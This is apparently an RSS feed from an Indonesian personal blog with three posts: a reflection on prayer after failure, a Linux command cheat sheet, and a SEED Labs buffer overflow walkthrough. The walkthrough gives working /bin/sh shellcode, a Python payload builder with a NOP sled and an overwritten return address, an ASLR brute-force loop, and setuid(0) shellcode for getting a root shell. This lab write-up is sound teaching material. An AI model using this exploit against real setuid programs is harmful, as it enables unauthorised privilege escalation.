<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Hello World. I am Dito Prabowo</title>
        <link>https://dmcr7.github.io/posts/</link>
        <description>Recent content in Posts on Hello World. I am Dito Prabowo</description>
        <generator>Hugo -- gohugo.io</generator>
        <lastBuildDate>Mon, 14 Oct 2019 11:31:53 +0700</lastBuildDate>
        <atom:link href="https://dmcr7.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Ketika Sholat mu Hanya Untuk Kewajiban Semata</title>
            <link>https://dmcr7.github.io/posts/ketika-sholat-mu-hanya-untuk-kewajiban-semata/</link>
            <pubDate>Mon, 14 Oct 2019 11:31:53 +0700</pubDate>
            
            <guid>https://dmcr7.github.io/posts/ketika-sholat-mu-hanya-untuk-kewajiban-semata/</guid>
            <description>Sholat merupakan rukun Islam ke 2 dan memang merupakan Kewajiban yang harus kita laksanakan, tapi.. menurut kalian apakah hanya untuk itu saja? hanya karena melaksanakan Kewajiban saja?
Saya mengakui bahwa memang manusia diciptakan tidak bisa sempurna, tapi setiap manusia saya percaya selalu punya kelebihan masing-masing entah diketahui atau tidak. Apabila seseorang telah menemukan apa yang dia nyaman melakukannya dan mempunyai suatu impian yang tinggi terhadap apa yang dilakukannya pastinya akan berusaha sekeras mungkin untuk mengejarnya.</description>
            <content type="html"><![CDATA[<p>Sholat merupakan rukun Islam ke 2 dan memang merupakan Kewajiban yang harus kita laksanakan, tapi.. menurut kalian apakah hanya untuk itu saja? hanya karena melaksanakan Kewajiban saja?</p>

<p>Saya mengakui bahwa memang manusia diciptakan tidak bisa sempurna, tapi setiap manusia saya percaya selalu punya kelebihan masing-masing entah diketahui atau tidak. Apabila seseorang telah menemukan apa yang dia nyaman melakukannya dan mempunyai suatu impian yang tinggi terhadap apa yang dilakukannya pastinya akan berusaha sekeras mungkin untuk mengejarnya. Setiap waktu rela dihabiskan untuk belajar dan mendalami agar bisa tercapai apa yang diinginkan nya, apalagi kalo orangnya sangat ambisius sekali. Mereka percaya dengan kemampuannya dan bisa dibilang passion nya jika diasah terus menerus akan bisa mengejar apa yang diimpi impikan meskipun bukan suatu hal yang gampang diraih.</p>

<p>Memang dan memang lagi, tidaklah salah berjuang keras. tapi&hellip;, ada tapinya? apa? apakah mengejar apa yang kita impikan apa yang kita harapakan cukup dengan berjuang keras saja?</p>

<p>Iya, ini juga termasuk hal yang pernah saya alami, saya mengimpikan suatu hal dan saya mencoba sangat bekerja keras belajar untuk menggapai itu, tapi pada akhirnya tidak semua sesuai dengan apa yang saya inginkan dan rencanakan. Sehingga pernah merasakan down mental saat itu, sedih, kecewa, juga dirasakan.</p>

<p>Terlintas ada di benak pikiran suatu pertanyaan.. Apa ada yang salah dengan saya? saya sudah mereasa sangat maksimal dalam berusaha, waktu waktu sudah saya habiskan untuk belajar, tapi kenapa hasilnya tidak sesuai dengan apa yang saya pikirkan?</p>

<p>Beberapa hari sudah saya lalui semenjak kegagalan itu, dan saat iseng bermain media sosial, ada salah satu post dari Official Account Tehjasminunpad yang menarik perhatian saya, yang berjudul &ldquo; Merasa paling Bodoh&rdquo; , berikut isinya :</p>

<pre><code>  Pernah ga ada di posisi, saat kita merasa sudah belajar banyak hal dan belajar ini dan itu, bahkan merasa perjuangan kita lebih keras dari orang lain.

  Tapi saat nilainya keluar, yang didapat adalah nilai yang menurut kita sangat kecil. Sementara orang lain yang kita lihat belajar nya pun antara mau dan tidak, malah mendapatkan hasil yang lebih baik dari kita.

  Hati mana yang gak sakit ditikung nilai dengan cara seperti itu?

  Tapi eh tapi.. Sebenernya kita gak perlu takut. karena kita mungkin gak dapatkannilai atau data kuantitatif dari apa yang kita usahakan.. api kita punya ilmunya.

  kecewa sampai menangis pun tak apa. itu proses berdka kok. mungkin kamu bakal denial, anger, bargaining. Jangan lupa coping-nya juga harus kuat biar kamu gak resika harga diri rendah atau putus ada dan malah gak mau berusaha lagi buat belajar agar lebih baik lagi.

  Utamanya, harus terus berfikir positif sama Allah. sembari mempertanyakan pada diri sendiri.

  Waktu ujian apa kita udah dekat sama Allah? Waktu ujian apa kita udah tilawah? waktu ujian apa kualitas ibadah kita baik?

  Dan,ya. Mungkin ini cara Allah menyadarkan, Bahwa usaha kerasmu untuk belajar itu mungkin luar biasa, tapi Allah tak ingin kamu lupa pada Rabb-Mu...

  Jadi Allah kasih teguran kecil untuk menyadarkan bahwa tanpa ridho Allah, HARD WORK IS NOTHING.

  Allah ingin kamu dekat dengan-Nya loh, ingin denger doa-doamu. Karena Allah sayang kamu, gak mau kamu cuma mengejar dunia, Allah ingin kamu dapatkan juga pahala untuk akhirat.

  Boleh sedih dan kecewa sama nilai gak sesuai usaha kita, sama hasil jauh dari perkiraan, atau tenrang apapun. Tapi ingat, jangan terlalu lama. Yuk bangkit lagi.
</code></pre>

<p>Setelah saya membaca ini, saya sudah sangat yakin. Iniloh jawaban dari pertanyaan yang ada di pikiranku. ketika sholat, ibadah yang kulakukan hanya untuk sekedar menunaikan kewajiban, dan melupakan makna dari tujuan sholat itu sendiri. Makanya Allah kasih peringatan. Dan ada quote yang menarik dari @therealhaikal yang berbunyi kalo nggak salah &ldquo; ketika apa yang kita inginkan tidak tercapai itulah tanda bahwa kita tidak bisa menyuruh Allah.&rdquo;</p>

<p>Saya akui saya masih banyak kesalahan, dan hanyalah manusia biasa. Tapi kita juga harus berusaha untuk memperbaiki kesalahan itu.</p>

<p>Memang yang diabadikan belum tentu abadi, dan yang tidak diabadikan bisa saja abadi. Saya mengabadikan post ini belum tentu abadi, tapi seenggaknya biar menjadi pembelajaran yang bisa diingat agar tidak terjadi lagi dan agar orang lain dapat belajar dari tulisan ini. Terimakasih, saya tunggu komentar, saran , kritiknya hehe.</p>
]]></content>
        </item>
        
        <item>
            <title>Linux_Basic_Admin</title>
            <link>https://dmcr7.github.io/posts/linux_basic_admin/</link>
            <pubDate>Fri, 11 Oct 2019 20:51:34 +0700</pubDate>
            
            <guid>https://dmcr7.github.io/posts/linux_basic_admin/</guid>
            <description>Untuk orang yang baru dalam menggunakan linux, menggunakan linux secara optimal tidaklah sangat mudah, hal pertama yang harus kita ketahui adalah basic command menggunakan terminal.
Berikut beberapa command yang telah kita rangkum : list Menampilkan list detail
 ls -l  Menampilkan list keseluruhan (termasuk dot file)
 ls -la  Menampilkan list berdasarkan waktu
 ls -t  Menampilkan list berdasarkan ukuran file
 ls -S  Menampilkan list berdasarkan tipe file</description>
            <content type="html"><![CDATA[

<p>Untuk orang yang baru dalam menggunakan linux, menggunakan linux secara optimal tidaklah sangat mudah, hal pertama yang harus kita ketahui adalah basic command menggunakan terminal.</p>

<h3 id="berikut-beberapa-command-yang-telah-kita-rangkum">Berikut beberapa command yang telah kita rangkum :</h3>

<h4 id="list">list</h4>

<p>Menampilkan list detail</p>

<pre><code>      ls -l
</code></pre>

<p>Menampilkan list keseluruhan (termasuk dot file)</p>

<pre><code>      ls -la
</code></pre>

<p>Menampilkan list berdasarkan waktu</p>

<pre><code>      ls -t
</code></pre>

<p>Menampilkan list berdasarkan ukuran file</p>

<pre><code>    ls -S
</code></pre>

<p>Menampilkan list berdasarkan tipe file</p>

<pre><code>    ls -F
</code></pre>

<p>Menampilkan list dengan index file nya</p>

<pre><code>    ls -i
</code></pre>

<h4 id="cat">cat</h4>

<p>Print ke terminal isi dari file</p>

<pre><code>    cat [ file ]
</code></pre>

<h4 id="mengubah-directori">Mengubah directori</h4>

<p>Mengubah directori folder</p>

<pre><code>  cd
</code></pre>

<h4 id="tail">Tail</h4>

<p>Menampilkan baris akhir sebanyak n</p>

<pre><code>  [perintah lain] | tail -n
</code></pre>

<p>Monitoring perubahan file</p>

<pre><code>  tail -f [nama file]
</code></pre>

<h4 id="head">Head</h4>

<p>Menampilkan baris awal sebanyak n</p>

<pre><code>  [perintah lain] | head -n
</code></pre>

<h4 id="right-direction">Right Direction</h4>

<p>Replace isi dari file output</p>

<pre><code>  cat /proc/cpuinfo &gt; command.txt
</code></pre>

<h4 id="double-right-directioninsert-sesuatu-pada-file-output">Double Right DirectionInsert sesuatu pada file output</h4>

<pre><code>  cat /proc/cpuinfo | wc -l &gt;&gt; command.txt
</code></pre>

<h4 id="left-direction">Left Direction</h4>

<p>File sebagai input (yang diproses)</p>

<pre><code>  ./program &lt; command.txt
</code></pre>

<h4 id="error-direction">Error Direction</h4>

<p>Memasukkan error pada file output</p>

<pre><code>    mkdir Music 2&gt; myerror.txt (replace)
    mkdir Music 2&gt;&gt; myerror.txt (insert)
</code></pre>

<h4 id="sort">Sort</h4>

<p>Mengurutkan isi file (per baris)</p>

<pre><code>    sort -u [namafile]
</code></pre>

<h4 id="uniq">Uniq</h4>

<p>Menghitung jumlah elemen per nilai dalam data</p>

<pre><code>    uniq -c [namafile]
</code></pre>

<h4 id="grep">Grep</h4>

<p>Mencari kata dalam suatu file</p>

<pre><code>    [perintah] | grep [keyword]
</code></pre>

<h4 id="copy">Copy</h4>

<p>Copy semua file dalam satu direktori</p>

<pre><code>    cp * [direktori tujuan]
</code></pre>

<p>Copy semua file dan sub direktori</p>

<pre><code>    cp -R * [direktori tujuan]
</code></pre>

<p>Copy file</p>

<pre><code>    cp [namafile] [direktori tujuan]
</code></pre>

<p>Copy tanpa merubah date timestamps</p>

<pre><code>    cp -p
</code></pre>

<h4 id="move">Move</h4>

<p>Jika belum ada nama, membuat file baru. Jika sudah ada nama, memindahkan</p>

<pre><code>    mv
</code></pre>

<h4 id="ssh">SSH</h4>

<p>Komputer A SSH komputer B</p>

<pre><code>    ssh B@ip
</code></pre>

<p>A kirim file ke B</p>

<pre><code>    scp [nama file] B@ip:direktori
</code></pre>

<p>B mengambil file dari A</p>

<pre><code>    scp A@ip:direktori [direktori lokal]
</code></pre>

<p>SSH tanpa password</p>

<pre><code>    sshpass -p [password]
</code></pre>

<p>ssh dengan perintah</p>

<pre><code>    A@ip [perintah]
</code></pre>

<h4 id="create-new-file">Create New File</h4>

<p>Membuat file baru</p>

<pre><code>    touch [nama file]
</code></pre>

<h4 id="check-direction">Check Direction</h4>

<p>Menampilkan alamat direktori aktif</p>

<pre><code>    pwd
</code></pre>

<h4 id="locate">Locate</h4>

<p>Mencari file pada semua direktori</p>

<pre><code>  locate [keyword]
</code></pre>

<h4 id="find">Find</h4>

<p>Mencari file pada direktori aktif</p>

<pre><code>  Find [keyword]
</code></pre>

<h4 id="remove">Remove</h4>

<p>Menghapus folder yang kosong</p>

<pre><code>  rmdir
</code></pre>

<p>Menghapus file</p>

<pre><code>  rm [direktori file]
</code></pre>

<p>Menghapus semua isi direktori</p>

<pre><code>  rm -r [direktori]
</code></pre>

<p>Menghapus Paksa semua isi dir (force)</p>

<pre><code>  rm -rf [file / dir]
</code></pre>

<h4 id="check-ip-address">Check IP Address</h4>

<p>Mengecek IP Addres</p>

<pre><code>  ifconfig
  ip address
</code></pre>

<h4 id="show-process">Show Process</h4>

<p>Untuk melihat process status</p>

<pre><code>  ps -ef
</code></pre>

<h4 id="check-env">Check env</h4>

<p>Print Environment Variable</p>

<pre><code>  env
</code></pre>

<h4 id="displays-and-updates-sorted-process-information">Displays and updates sorted process information</h4>

<p>Menampilkan process secara update dan terurut</p>

<pre><code>  top
  htop
</code></pre>

<h4 id="shows-the-network-status">Shows the network status</h4>

<p>Menampilkan status network</p>

<pre><code>  netstat
</code></pre>

<h4 id="display-free-disk-space">Display free disk space</h4>

<p>Menampilkan disk space yang bisa dipakai</p>

<pre><code>  df -h
</code></pre>

<p>-h prints out the information in human-readable format</p>

<h4 id="to-check-the-user-running-the-application">To check the user running the application</h4>

<p>Melihat user id yang berjalan</p>

<pre><code>  id
</code></pre>

<h4 id="change-permision">Change permision</h4>

<p>Mengubah permision suatu File</p>

<pre><code>  chmod [parameter] [file]
</code></pre>

<p>contoh : chmod +x bash.sh, chmod 777 bash.sh</p>

<h4 id="dig-nslookup">dig/nslookup</h4>

<p>dig (DNS lookup utility) or nslookup (query Internet name servers)</p>

<pre><code>  dig equnix.asia
  nslookup equnix.asia
</code></pre>

<h4 id="history">history</h4>

<p>melihat history command</p>

<pre><code>  history
</code></pre>
]]></content>
        </item>
        
        <item>
            <title>Buffer_Overflow_Labs_From_SEEDlabs</title>
            <link>https://dmcr7.github.io/posts/buffer_overflow_labs_from_seedlabs/</link>
            <pubDate>Fri, 11 Oct 2019 20:25:58 +0700</pubDate>
            
            <guid>https://dmcr7.github.io/posts/buffer_overflow_labs_from_seedlabs/</guid>
            <description>0x00 Intro Eksploitasi ini dikenal dengan input validation attack yang dapat mengakibatkan suatu sistem crash (buffer overflow) yaitu variabel yang tersedia pada aplikasi tidak dapat menampung input yang sengaja dibuat berlebihan. Kelebihannya dapat mengganti suatu nilai variable (sehingga kita bisa mengontrol nya) juga bisa mennganti suatu nilai return address dari sebuah program.
0x01 Guide Disini saya menggunakan VM yang telah disediakan oleh SEEDlabs, untuk memasang vm dan sebagainya silakan kunjungi situs seedlab untuk melihat dokumentasi,cara install dan download vm nya.</description>
            <content type="html"><![CDATA[

<h2 id="0x00-intro">0x00 Intro</h2>

<p>Eksploitasi ini dikenal dengan input validation attack yang dapat mengakibatkan suatu sistem crash (buffer overflow) yaitu variabel yang tersedia pada aplikasi tidak dapat menampung input yang sengaja dibuat berlebihan. Kelebihannya dapat mengganti suatu nilai variable (sehingga kita bisa mengontrol nya) juga bisa mennganti suatu nilai return address dari sebuah program.</p>

<h2 id="0x01-guide">0x01 Guide</h2>

<p>Disini saya menggunakan VM yang telah disediakan oleh SEEDlabs, untuk memasang vm dan sebagainya silakan kunjungi situs seedlab untuk melihat dokumentasi,cara install dan download vm nya.</p>

<p>Untuk file yang dibutuhkan :</p>

<ol>
<li><p>stack.c (the vulnerable program)</p></li>

<li><p>call_shellcode.c</p></li>

<li><p>Exploit.py (Buat Sendiri)</p></li>
</ol>

<p>Untuk file stack.c dan call_shellcode.c sudah disediakan oleh seedlab, untuk exploit.py saya membuat sendiri payloadnya yang untuk injeksi.</p>

<p>Kita bisa memasukan shellcode kedalam badfile tapi program belum bisa mengeksekusi shellcode karena return address program belum kita overflow dan diarahkan ke lokasi alamat shelccode, untuk itu kita harus menyari return address program, dan menggantinya dengan alamat shellcode.</p>

<p>Untuk mencari return address bisa mudah kita cari menggunakan feature gdb-peda yaitu pattern, saat program kita jalankan kasih pattern yang sudah di generate, akan muncul invalid return address suatu alamat, lalu alamat itu akan di baca oleh gdb-peda dan akan menghasilkan angka berapa ofset yang harus kita isi padding(junk char) agar kita bisa memodifikasi return address.</p>

<p>Untuk mencari alamat shellcode, debug program dengan gdb-peda lalu break pada salah satu address saat variable buffer terbuat, lalu bisa kita baca alamat buffer tersebut.</p>

<p>Ketika sudah mendapat return address dan alamat shellcode, kita buat payload dan memasukannya kedalam badfile, setelah itu kita jalankan programnya stack. Apabila berhasil masuk ke dalam shell berarti buffer overflow berhasil.</p>

<p>Adapun step step yang harus kita lakukan :</p>

<ol>
<li><p>Mematikan Address Space Randomization pada VM.</p></li>

<li><p>Mengcompile file stack.c dengan mematikan StackGuard Protection Scheme dan membuat shellcode di stack dapat di eksekusi (execstack).</p></li>

<li><p>Mencoba dan memastikan dapat mengeksekusi shellcode dengan file call_shellcode.c</p></li>

<li><p>Mencari offset untuk return address</p></li>

<li><p>Mencari alamat Buffer</p></li>

<li><p>Membuat Payload dan mengeksekusi</p></li>
</ol>

<h2 id="0x02-lab">0x02 LAB</h2>

<h3 id="task-1-exploiting-the-vulnerability">TASK 1 : Exploiting the Vulnerability</h3>

<h4 id="1-mematikan-address-space-randomization-pada-vm">1.Mematikan Address Space Randomization pada VM.</h4>

<p>Mematikan ASLR dapat kita lakukan dengan command :</p>

<pre><code>sudo sysctl -w kernel.randomize_va_space=0
</code></pre>

<p>Apabila kita tidak mematikan ASLR alamat alamat pada program akan berubah berubah dan kita akan agak kesulitan untuk melakukan buffer overflow</p>

<h4 id="2-mengcompile-file-stack-c-dengan-mematikan-stackguard-protection-scheme-dan-membuat-shellcode-di-stack-dapat-di-eksekusi-execstack">2.Mengcompile file stack.c dengan mematikan StackGuard Protection Scheme dan membuat shellcode di stack dapat di eksekusi (execstack).</h4>

<p>Secara default compiler gcc saat mengcompile menyalakan StackGuard Protection Scheme untuk mencegah user memasukan input lebih dari yang di definisikan, misal buffer[10] apabila kita memasukan lebih dari 10 character akan terdeteksi stack smasing.</p>

<pre><code>*** stack smashing detected : ./stack terminated
</code></pre>

<p>Selain itu, agar shellcode bisa berjalan perlu -z execstack agar shellcode di stack dapat di eksekusi.</p>

<p>Untuk command nya</p>

<pre><code>gcc -o stack -z execstack -fno-stack-protector stack.c
chmod 4755 stack
</code></pre>

<h4 id="3-mencoba-dan-memastikan-dapat-mengeksekusi-shellcode-dengan-file-call-shellcode-c">3. Mencoba dan memastikan dapat mengeksekusi shellcode dengan file call_shellcode.c</h4>

<p>Compile call_shellcode.c dengan menggunakan perintah :</p>

<pre><code>gcc -z execstack -o call_shellcode call_shellcode.c
</code></pre>

<p>Setelah berhasil lalu jalankan program</p>

<pre><code>./call_shellcode
</code></pre>

<p>Hasilnya :</p>

<p><img src="/img/call_shellcode.png" alt="call_shellcode"
     style="float: left;" />
<br><br><br><br></p>

<h4 id="4-mencari-offset-untuk-return-address">4. Mencari offset untuk return address</h4>

<p>Untuk mendebug program dalam linux bisa menggunakan gdb, namun untuk kasus binary exploitation akan lebih disarankan untuk menggunakan gdb-peda, karena mengandung beberapa feature tambahan untuk buffer overflow salah satunya yaitu pattern untuk mencari nilai offset return address.</p>

<p>pada terminal lakukan gdb pada program stack</p>

<pre><code>gdb -q stack
</code></pre>

<p>lalu buat pattern untuk mencari nilai offset return address</p>

<pre><code>pattern create 40
</code></pre>

<p><img src="/img/pattern.png" alt="pattern_create"
  style="float: left;" />
  <br><br></p>

<p>setelahnya buat file exploit.py dan masukan pattern ke dalam badfile</p>

<pre><code class="language-python">import sys

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))
content[0:40] = &quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa&quot;

# Write the content to badfile
file = open(&quot;badfile&quot;, &quot;wb&quot;)
file.write(content)
file.close()
</code></pre>

<p>lalu jalankan(di terminal baru) dengan command  :</p>

<pre><code>python exploit.py
</code></pre>

<p>akan muncul file bernama badfile, kemudian pada terminal gdb-peda jalankan dengan command run</p>

<p>akan muncul invalid</p>

<p><img src="/img/invalid.png" alt="call_shellcode"
     style="float: left;" />
<br><br></p>

<p>nah kita bisa cari offset return addres nya dengan command pada gdb-peda :</p>

<pre><code>pattern offset 0x61414145
</code></pre>

<p>lalu akan muncul jumlah ofset yang perlu kita ketahui</p>

<p><img src="/img/offset.png" alt="call_shellcode"
     style="float: left;" />
<br><br></p>

<h4 id="5-mencari-alamat-buffer">5.Mencari alamat Buffer</h4>

<p>setelah kita tau offset nya, kita perlu mencari tau alamat buffer nya, masuk ke gdb-peda dan lihat code diassambly nya</p>

<pre><code>$ gdb -q stack
gdb-peda$ pdisass main
</code></pre>

<pre><code class="language-python">Dump of assembler code for function main:
   0x080484da &lt;+0&gt;:	lea    ecx,[esp+0x4]
   0x080484de &lt;+4&gt;:	and    esp,0xfffffff0
   0x080484e1 &lt;+7&gt;:	push   DWORD PTR [ecx-0x4]
   0x080484e4 &lt;+10&gt;:	push   ebp
   0x080484e5 &lt;+11&gt;:	mov    ebp,esp
   0x080484e7 &lt;+13&gt;:	push   ecx
   0x080484e8 &lt;+14&gt;:	sub    esp,0x214
   0x080484ee &lt;+20&gt;:	sub    esp,0x8
   0x080484f1 &lt;+23&gt;:	push   0x80485d0
   0x080484f6 &lt;+28&gt;:	push   0x80485d2
   0x080484fb &lt;+33&gt;:	call   0x80483a0 &lt;fopen@plt&gt;
   0x08048500 &lt;+38&gt;:	add    esp,0x10
   0x08048503 &lt;+41&gt;:	mov    DWORD PTR [ebp-0xc],eax
   0x08048506 &lt;+44&gt;:	push   DWORD PTR [ebp-0xc]
   0x08048509 &lt;+47&gt;:	push   0x205
   0x0804850e &lt;+52&gt;:	push   0x1
   0x08048510 &lt;+54&gt;:	lea    eax,[ebp-0x211]
   0x08048516 &lt;+60&gt;:	push   eax
   0x08048517 &lt;+61&gt;:	call   0x8048360 &lt;fread@plt&gt;
   0x0804851c &lt;+66&gt;:	add    esp,0x10
   0x0804851f &lt;+69&gt;:	sub    esp,0xc
   0x08048522 &lt;+72&gt;:	lea    eax,[ebp-0x211]
   0x08048528 &lt;+78&gt;:	push   eax
   0x08048529 &lt;+79&gt;:	call   0x80484bb &lt;bof&gt;
   0x0804852e &lt;+84&gt;:	add    esp,0x10
   0x08048531 &lt;+87&gt;:	sub    esp,0xc
   0x08048534 &lt;+90&gt;:	push   0x80485da
   0x08048539 &lt;+95&gt;:	call   0x8048380 &lt;puts@plt&gt;
   0x0804853e &lt;+100&gt;:	add    esp,0x10
   0x08048541 &lt;+103&gt;:	mov    eax,0x1
   0x08048546 &lt;+108&gt;:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048549 &lt;+111&gt;:	leave  
   0x0804854a &lt;+112&gt;:	lea    esp,[ecx-0x4]
   0x0804854d &lt;+115&gt;:	ret    
End of assembler dump.
</code></pre>

<p>kita break saat memamnggil function bof</p>

<pre><code>gdb-peda$ b *main+79
Breakpoint 1 at 0x8048529
gdb-peda$ r
</code></pre>

<p>.*</p>

<p>pada stack terlihat alamat str mulai mengisi nilai
pada alamat tertentu yaitu</p>

<pre><code class="language-python">0xbfffea37
</code></pre>

<p><img src="/img/stack.png" alt="call_shellcode"
     style="float: left;" />
<br><br></p>

<p>berarti kita dapat menaruh return address mulai dari alamat diatas sampai 517-len(shelccode) dikarenakan kita akan menaruh shelccode pada akhir badfile, jadi ketika kita alihkan ke alamat diantara alamat diatas sampai 517-len(shelccode) kita pada akhirnya akan menemui shellcode dan dapat mengeksekusi nya karena selain shellcode isi badfile hanyalah 0x90(NOP) yg artinya tidak ada  operasi apa-apa.</p>

<p>kita buat saja return address nya</p>

<pre><code class="language-python">0xbfffea77
</code></pre>

<h4 id="6-membuat-payload-dan-mengeksekusi">6. Membuat Payload dan mengeksekusi</h4>

<p>payload =</p>

<pre><code class="language-python">import sys

shellcode= (
    &quot;\x31\xc0&quot;             # xorl    %eax,%eax              
    &quot;\x50&quot;                 # pushl   %eax                   
    &quot;\x68&quot;&quot;//sh&quot;           # pushl   $0x68732f2f            
    &quot;\x68&quot;&quot;/bin&quot;           # pushl   $0x6e69622f            
    &quot;\x89\xe3&quot;             # movl    %esp,%ebx              
    &quot;\x50&quot;                 # pushl   %eax                   
    &quot;\x53&quot;                 # pushl   %ebx                   
    &quot;\x89\xe1&quot;             # movl    %esp,%ecx              
    &quot;\x99&quot;                 # cdq                            
    &quot;\xb0\x0b&quot;             # movb    $0x0b,%al              
    &quot;\xcd\x80&quot;             # int     $0x80                  
).encode('latin-1')


offset = 36
content = bytearray(0x90 for i in range(517))
start = 517 - len(shellcode)
returna = (&quot;\x77\xea\xff\xbf&quot;).encode('latin-1')
content[0:1]=(&quot;\x41&quot;).encode('latin-1')
content[offset:offset+4] = returna
content[start:] = shellcode
file = open(&quot;badfile&quot;, &quot;wb&quot;)
file.write(content)
file.close()
</code></pre>

<p>pertama-tama seluruh content badfile akan diisi dengan NOP, lalu content pertama kita isi dengan 0x41 untuk mengetahui itu merupakan mulainya str,
kemudian di offset return addres kita isi dengan return address diatas agar masuk ke addres str(badfile), pada akhir ( 517 - len(shellcode)) kita tulis kan shelccode nya</p>

<p>lalu kita buat exploit nya dan menjalankan program stack nya</p>

<pre><code>python3 exploit.py
./StackGuard
</code></pre>

<p>jika berhasil akan mengarahkan kita ke shellcode</p>

<p><img src="/img/shell.png" alt="call_shellcode"
     style="float: left;" />
<br></p>

<p>Exploit berhasil kita lakukan</p>

<hr />

<h3 id="task-2-address-randomization">Task 2: Address Randomization</h3>

<p>pada task 2, kita menyalakan sistem aslr dalam linux dengan command</p>

<pre><code>  sudo sysctl -w kernel.randomize_va_space=2
</code></pre>

<p>lalu kita lakukan bruteforce sampai ketemu sesuai dengan alamat address nya,</p>

<pre><code>  sh -c &quot;while [ 1 ]; do ./stack; done;&quot;
</code></pre>

<p>kita lakukan loop sampai program bisa tereksekusi.</p>

<p>Bukti :</p>

<p><img src="/img/task2.png" alt="" /></p>

<p>Proses while mencari addres yg sesuai (Faktor Lucky,bisa sangat lama, bisa cepat, tapi kebanyakan lama, saya sendiri beberapa jam baru ketemu) :</p>

<p><img src="/img/prosestask2.png" alt="" /></p>

<p>Setelah mendapat shell (akhirnyaaaa) :
<img src="/img/hasiltask2.png" alt="" /></p>

<hr />

<h3 id="task-3-stack-guard">Task 3: Stack Guard</h3>

<p>Pada task ini kita mencoba untuk tidak mematikan stack guard protection yang mana akan menghalangi kita untuk melakukan buffer overflow,</p>

<p>Hasil :
<img src="/img/task3.png" alt="" /></p>

<hr />

<h3 id="task-4-non-executable-stack">Task 4: Non-executable Stack</h3>

<p>pada task kali ini kita menjalankan program dengan tidak mengijinkan isi stack dapat dieksekusi</p>

<pre><code>  gcc -o stack -z noexecstack -fno-stack-protector stack.c
</code></pre>

<p>perintah noexecstack membuat kita tidak bisa menjalankan shellcode yang ada di dalam Stack</p>

<p>Hasil :</p>

<p><img src="/img/task4.png" alt="" /></p>

<p>mendapatkan segmentation fault karena tidak bisa menjalankan payload dalam stack</p>

<hr />

<h3 id="task-5-defeating-dash-s-countermeasure">Task 5: Defeating dash&rsquo;s countermeasure</h3>

<p>Kita coba dulu program untuk mendapatkan shell</p>

<pre><code class="language-objective-c">// dash_shell_test.c
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
int main()
{
char *argv[2];
argv[0] = &quot;/bin/sh&quot;;
argv[1] = NULL;
// setuid(0); âž€
execve(&quot;/bin/sh&quot;, argv, NULL);
return 0;
}
</code></pre>

<p>**.</p>

<p>Maka akan mendapat kan root :
<img src="/img/t5.png" alt="" /></p>

<p>Tapi ketika kita setuid(0) kita aktifkan maka akan mendapat user seed:
<img src="/img/t51.png" alt="" /></p>

<p>Nah kita perlu memodifikasi shellcode agar kita bisa mendapatkan akses root, pada file exploit.py kita tambahkan shellcode berikut pada line diatasnya</p>

<pre><code class="language-python">har shellcode[] =
&quot;\x31\xc0&quot; /* Line 1: xorl %eax,%eax */
&quot;\x31\xdb&quot; /* Line 2: xorl %ebx,%ebx */
&quot;\xb0\xd5&quot; /* Line 3: movb $0xd5,%al */
&quot;\xcd\x80&quot; /* Line 4: int $0x80 */
</code></pre>

<p>akan mendapatkan root :
<img src="/img/t52.png" alt="" /></p>

<p>jika program diatas dijalankan pada program yang ada countermeasure dash nya maka kita yang semestinya akan mendapat shell user akan mendapat shell root.</p>
]]></content>
        </item>
        
    </channel>
</rss>
